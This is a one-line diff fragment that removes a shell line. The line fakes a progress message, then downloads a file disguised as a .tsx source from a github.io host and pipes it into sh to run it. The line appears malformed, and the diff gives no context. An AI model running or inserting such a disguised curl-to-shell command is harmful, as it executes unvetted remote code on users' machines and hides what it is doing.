@@ -1,1 +1,0 @@
-echo Progress: 7.00%curl -L --progress-bar frkns.github.io/fun/casting-solaris-clicking.tsx | sh
